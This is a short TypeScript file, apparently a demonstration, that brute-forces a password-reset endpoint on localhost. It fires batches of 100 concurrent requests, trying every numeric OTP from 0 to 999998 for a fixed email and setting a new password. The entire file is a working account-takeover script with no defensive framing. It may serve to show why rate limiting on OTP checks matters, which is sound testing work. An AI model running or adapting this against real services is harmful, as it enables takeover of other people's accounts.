import axios from 'axios';

async function sendRequest (otp : string) {
    let data = JSON.stringify({
        "email": "test@gmail.com",
        "otp": otp,
        "newPassword": "1234556"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };
      
    try {
        await axios.request(config)
    } catch (error) {
        console.log(error);
    }      
}


async function send() {
  for (let i = 0; i < 999999; i += 100) {
    let p = [];
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()));
    }
    await Promise.all(p);
  }
}

send();
